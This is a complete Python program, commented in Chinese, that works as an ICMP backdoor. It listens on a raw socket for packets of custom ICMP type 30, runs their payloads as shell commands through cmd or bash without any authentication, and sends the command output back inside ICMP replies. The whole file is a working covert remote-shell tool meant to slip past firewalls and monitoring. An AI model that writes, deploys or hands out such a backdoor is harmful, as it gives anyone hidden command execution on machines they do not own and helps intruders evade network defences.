#!/usr/bin/env python3
import os
import subprocess
import socket
import struct
import select
import time
import sys

class ICMPServer:
    def __init__(self):
        self.is_windows = sys.platform.startswith('win')
        print(f"运行在 {'Windows' if self.is_windows else 'Linux'} 系统上")
        
        try:
            # 创建原始套接字
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # 设置超时
            self.sock.settimeout(5)
            
            # 在Windows上，需要绑定到特定接口
            if self.is_windows:
                self.sock.bind(('0.0.0.0', 0))
                
            print("ICMP 套接字创建成功")
        except Exception as e:
            print(f"创建套接字时出错: {e}")
            print("请以管理员权限运行此脚本")
            exit(1)
        
        self.client_addr = None
        
    def calculate_checksum(self, data):
        """计算ICMP校验和"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            checksum += w
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        return checksum
    
    def parse_icmp_packet(self, packet):
        """解析ICMP数据包"""
        try:
            # Windows raw sockets 接收包含IP头的完整数据包
            # Linux raw sockets 接收不包含IP头的ICMP数据
            if self.is_windows:
                # Windows: 总是包含IP头，跳过IP头
                if len(packet) < 20:
                    return 0, 0, 0, 0, 0, b''
                
                # 获取IP头长度 (IHL * 4)
                ip_header_len = (packet[0] & 0x0F) * 4
                if len(packet) < ip_header_len + 8:
                    return 0, 0, 0, 0, 0, b''
                
                icmp_header = packet[ip_header_len:ip_header_len+8]
                data = packet[ip_header_len+8:]
            else:
                # Linux: 不包含IP头
                if len(packet) < 8:
                    return 0, 0, 0, 0, 0, b''
                
                icmp_header = packet[:8]
                data = packet[8:]
            
            icmp_type, code, checksum, packet_id, seq = struct.unpack("!BBHHH", icmp_header)
            print(f"解析ICMP包: type={icmp_type}, code={code}, id={packet_id}, seq={seq}, data_len={len(data)}")
            return icmp_type, code, checksum, packet_id, seq, data
        except Exception as e:
            print(f"解析数据包时出错: {e}")
            return 0, 0, 0, 0, 0, b''
    
    def create_icmp_reply(self, icmp_type, code, packet_id, seq, data):
        """创建ICMP回复包"""
        header = struct.pack("!BBHHH", icmp_type, code, 0, packet_id, seq)
        checksum = self.calculate_checksum(header + data)
        header = struct.pack("!BBHHH", icmp_type, code, checksum, packet_id, seq)
        return header + data
    
    def execute_command(self, command):
        """执行命令并返回结果"""
        try:
            if self.is_windows:
                # 在Windows上使用cmd
                result = subprocess.check_output(
                    command, 
                    shell=True, 
                    stderr=subprocess.STDOUT,
                    timeout=30
                )
            else:
                # 在Linux上使用bash
                result = subprocess.check_output(
                    f"/bin/bash -c \"{command}\"", 
                    shell=True, 
                    stderr=subprocess.STDOUT,
                    timeout=30
                )
            return result
        except subprocess.CalledProcessError as e:
            return e.output
        except subprocess.TimeoutExpired:
            return b"Command timeout"
        except Exception as e:
            return f"执行命令时出错: {str(e)}".encode()
    
    def run(self):
        print("ICMP命令服务器启动，等待客户端连接...")
        print("按 Ctrl+C 停止服务器")
        
        while True:
            try:
                # 接收数据包
                packet, addr = self.sock.recvfrom(1024)
                print(f"收到来自 {addr} 的数据包，长度: {len(packet)}")
                
                # 解析ICMP包
                icmp_type, code, checksum, packet_id, seq, data = self.parse_icmp_packet(packet)
                
                # 处理自定义类型的ICMP包（例如类型 30）
                if icmp_type == 30:  # 自定义类型
                    self.client_addr = addr
                    
                    # 提取命令
                    if data:
                        try:
                            command = data.decode('utf-8', errors='ignore').strip()
                            print(f"收到命令: {command}")
                            
                            # 执行命令
                            result = self.execute_command(command)
                            print(f"命令执行结果: {result.decode('utf-8', errors='ignore')}")
                            
                            # 发送结果（使用相同的自定义类型）
                            reply = self.create_icmp_reply(30, 0, packet_id, seq, result)
                            print(f"发送回复到 {addr}, 长度: {len(reply)}")
                            
                            # 在Windows上，需要确保发送完整的数据包
                            if self.is_windows:
                                # Windows可能需要构造完整的IP包，但原始套接字通常会自动处理
                                sent = self.sock.sendto(reply, addr)
                            else:
                                sent = self.sock.sendto(reply, addr)
                                
                            print(f"已发送 {sent} 字节到 {addr}")
                        except Exception as e:
                            print(f"处理命令时出错: {e}")
                            # 发送错误信息
                            error_msg = f"错误: {str(e)}".encode()
                            reply = self.create_icmp_reply(30, 0, packet_id, seq, error_msg)
                            self.sock.sendto(reply, addr)
                else:
                    print(f"忽略非自定义类型包: type={icmp_type}")
            except socket.timeout:
                # 超时是正常的，继续等待
                continue
            except KeyboardInterrupt:
                print("\n服务器已停止")
                break
            except Exception as e:
                print(f"处理数据包时出错: {e}")
                time.sleep(1)

if __name__ == "__main__":
    server = ICMPServer()
    server.run()